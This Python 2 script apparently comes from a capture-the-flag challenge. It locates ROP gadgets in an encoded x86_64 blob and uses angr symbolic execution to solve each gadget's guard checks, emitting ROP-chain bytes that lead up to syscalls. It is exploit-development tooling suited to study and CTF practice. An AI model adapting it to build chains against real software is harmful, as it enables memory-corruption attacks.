import copy
import StringIO
import base64

from util import *

# Knowledge base
# Contains ROP primitives with the corresponding solutions and addresses
global_kb = {
        'POP_RSI' : {
            'pattern' : Pattern("f4 5e", 1)
        },
        'POP_RAX' : {
            'pattern' : Pattern("f4 58", 1)
        },
        'SYSCALL' : {
            'pattern' : Pattern("f4 0f 05", 1)
        },
        'PUSH_RAX_POP_RDI' : {
            'pattern' : Pattern("f4 50 5f", 1)
        },
        'PUSH_RAX_POP_RDX' : {
            'pattern' : Pattern("f4 50 5a", 1)
        },
}

class Ropperator(object):
    def __init__(self, kb, gadgets):
        self.raw = base64.decodestring(gadgets)
        self.kb = copy.deepcopy(kb)
        self.base_address = 0

    def load_gadgets(self):
        """
        Pattern scan the x86_64 blob of gadgets for important ones
        Once we find them, record the address and size
        """
        for i in range(len(self.raw)):
            for name, gadget in self.kb.iteritems():
                pattern = gadget['pattern']

                j = 0
                while j < len(pattern) and (i+j) < len(self.raw):
                    if pattern[j] is not None and pattern[j] != ord(self.raw[i+j]):
                        break
                    j += 1

                if len(pattern) == j:
                    address = i + pattern.adjust
                    print("Pattern %s found at %#x" % (name, address))
                    gadget['address'] = address
                    gadget['size'] = len(pattern)-pattern.adjust

        bad = False
        for k,v in self.kb.iteritems():
            if 'address' not in v:
                print('Pattern %s NOT found' % k)
                bad = True

        return not bad

    def determine_guards(self):
        """
        Use symbolic execution through Angr in order to automatically
        solve the required guards (math problems) for each gadget.

        Start execution after the gadget start and navigate the correct
        path until return. Then concretize the symbolic guard values in to
        QWORDS for addition to the ROP chain.
        """
        print("Loading angr...")

        import angr
        import cle
        import archinfo

        # Nice hack to force Angr to load a blob :P
        loader = cle.Loader(StringIO.StringIO(self.raw), main_opts={
            "backend" : "blob",
            "custom_arch" : archinfo.ArchAMD64(),
            "custom_entry_point" : 0x0000
            }
        )

        p = angr.Project(loader)

        for k,v in self.kb.iteritems():
            print("Determining guard condition for %s" % k)

            # start at the gadget address PLUS the size of the gadget (we dont want to execute the gadget)
            addr = v['address'] + v['size']

            print("Starting symbolic execution at %#x" % addr)

            # Setup our path and path group
            state = p.factory.blank_state(addr=addr)
            path = p.factory.path(state)
            pg = p.factory.path_group(path)

            def filterfun(p):
                # we only want to use paths that jump if equal (je)
                # this checks the claripy (constraint solver equation)
                # equation to see if the operand is !=, which it will be
                # if we DO NOT take the 'je' instruction
                return p.guards[-1].op == "__ne__"

                # alternative check
                #if self.raw[p.addr] == "\xf4": # hlt instruction
                #    return True
                #else:
                #    return False

            # Run until a stop condition (we reach the 'ret' at the end of the gadget)
            while True:
                # Step all active paths forward by one basic block
                pg = pg.step()

                # Filter paths that hit a 'hlt' or dont take a jump
                pg.drop(filterfun)

                if p.factory.block(pg.active[0].addr).vex.jumpkind == "Ijk_Ret":
                    break

                # alternative check
                #if self.raw[pg.active[0].addr] == "\xc3": # ret instruction
                #    break
                # or even
                #if p.factory.block(pg.active[0].addr).bytes == "\xc3":
                #    break

            # We should only have one path
            assert len(pg.active) == 1

            # The final path we want to build the correct ROP guards for
            path = pg.active[0]

            def concretize_equations(path, eqs):
                solutions = []

                # For each guard (each branch taken, each basic block)
                # build up the required integers required to pass the checks
                for eq in eqs:
                    sym = []

                    # Look at all of the values and find the symbolic one (some memory address from the pop XX)
                    for i in eq.recursive_leaf_asts:
                        if i.symbolic:
                            sym.append(i)

                    # Hopefully there is one per guard...
                    assert len(sym) == 1

                    # Concretize the guard constraint (i.e the value REG in 'pop REG' needs to be after
                    # going through the math problem)
                    solutions += [path.state.se.any_int(sym[0])]

                return solutions

            # Make symbolic (x, y, z) --> concrete (1, 2, 3)
            solutions = concretize_equations(path, path.guards.hardcopy)

            # int -> little-endian 8-byte unsigned long
            v['guards'] = [qword(x) for x in solutions]

        return True

    def rop(self, name, arg=None):
        if name not in self.kb:
            raise ValueError("Unknown ROP gadget '%s'" % name)

        if arg is not None and not isinstance(arg, int):
            raise ValueError("Argument to ROP must be an integer")

        ret = ""

        # ROP: the gadget address
        ret += qword(self.base_address + self.kb[name]['address'])

        # The optional ROP argument
        # (this condition used to be 'if arg:' which caused a bug when arg was 0.
        #  once this was fixed, it was solved)
        if arg is not None:
            ret += qword(arg)

        # The guard value(s)
        ret += "".join(self.kb[name]['guards'])

        return ret

if __name__ == "__main__":
    test_string = "9PT09FBfWUiB8Yq/ZQZIgelg90FOSIHx0h85IEiB6dPtKjVIgfkd4s53dAf09PT09PT0WUiBwRS4GjBIgfFhZ6VKSIH5rdB1ZHQD9PT0WUiBwcrs0BdIgcFDkXMzSIHxZeoRIUiB+ctnRnN0BvT09PT09EFeSYHuJADELEmBxshihT5JgfZKx99ISYHuTIlMSEmB9rduJBBJge5nJV4uSYHGbfzBdUmB7riIB0xJgf6A3LI8dAT09PT0w/T09PT09PT0WEFbSYHrjgHHQkmB6yQAFW9JgfMH3GAFSYHzgDPzdUmBw/bEZxxJgfMHjUVnSYHzN6CKKkmB+/R9m3l0AvT0QVtJgcP1IBZ6SYHDbD6zQkmBwwntk0NJgcN2Jtx6SYHzOuoPTEmB61b3EWJJgfNXE3ozSYHronNEeEmB+6z42Wd0CPT09PT09PT0w/T09PT09PT0UFpBXUmB9QsQe09Jge1r5mAvSYHtJq3ra0mB9eG8bhVJge2JRwQaSYHt9lDJUEmB9UKChmpJgf2RdatDdAP09PRBX0mB7zaPoWVJge/3M/5PSYHvdQFUS0mB7z+Ysm1Jge8i0ElhSYH32tq5AkmB90PO3HhJgf+FiUYndAT09PT0W0iB82sqi19Iget8oGg1SIHz/KuGOEiB80ISmDpIgfNWfuhSSIH7BZe6I3QG9PT09PT0QVxJgfQcw9omSYHEJvlcZUmB7EUM+wFJgfQD3+w4SYH8I2sRW3QC9PRBX0mBx4oZQy1JgfeQvEhySYH3XboIB0mBxzs6aQFJgffTrxRxSYHHKRRTK0mB/zAvn0N0BPT09PRBW0mB62aUsUlJgesKSxFkSYH7YWKRR3QC9PRBW0mBw9wtjwlJgfN3oDR9SYHzck1DX0mB820rnAJJgcPuOwhiSYHDjkbbWEmB8zUziShJgfvBve4vdAX09PT09EFbSYHzVMlqM0mBwxRUjBhJges7GtIASYH7pV3mKHQG9PT09PT0w/QPBVlIgcH62uAgSIHx6SK3R0iB8V1+3G5IgemSKNRVSIHxxT9WJEiB8a5+tDJIgenY9p0tSIH5oNvzbXQJ9PT09PT09PT0QV9JgceRsKk1SYH3DFSbA0mBx9pEKgpJgfdtPhtiSYHHTRCRZkmBx2gdSx1Jgf+BGqgLdAL09FtIgevrzyZ1SIHrlfU7TkiB68oxrWdIgfsmsOBrdAL09FtIgfOFposcSIHzsDs0bUiB63A/yn1IgcP/X78PSIH7+ubVZHQG9PT09PT0QV9JgfeM59BfSYH/37U+BXQF9PT09PRBXUmBxSBzlCZJgf0JgzRjdAb09PT09PRBW0mBwyXLinhJgeud0cRlSYHr+F7FTkmBwzhIjx5JgfOCNrJzSYHrVF7QQEmBwxwZGilJgcNCSQJWSYH7/BwOUXQI9PT09PT09PTD9PT09PReW0iB8/ftHQxIget3gJorSIHDkysECUiB66XrwBhIgfM6q+0gSIHDerz1aUiB8579tzhIgfsgVAFxdAb09PT09PRBW0mB64dcrQhJgfMXj0cZSYHDyV3PT0mB60YhPmFJgeu9oVgfSYHDxvjhOkmB+56nOz90BvT09PT09FlIgfGvR0IWSIHxH9Vsb0iB8ShMnEFIgcHYPfdWSIHpSO3tHkiB8dGLthRIgfkG/18DdAL09EFeSYHuNFxVbEmB/kaBs010AvT0QV1JgfUAC5gZSYHtTYPTZUmBxfIm/ntJge1Nn145SYHF2CRQE0mB/SVgD2V0A/T09EFcSYHESm72ckmBxCR/Sl1Jgfxlosk8dAf09PT09PT0ww=="

    rop = Ropperator(global_kb, test_string)

    ret = rop.load_gadgets()

    if not ret:
        raise ValueError("Failed to load gadgets...")

    ret = rop.determine_guards()

    if not ret:
        raise ValueError("Failed to determine guards...")
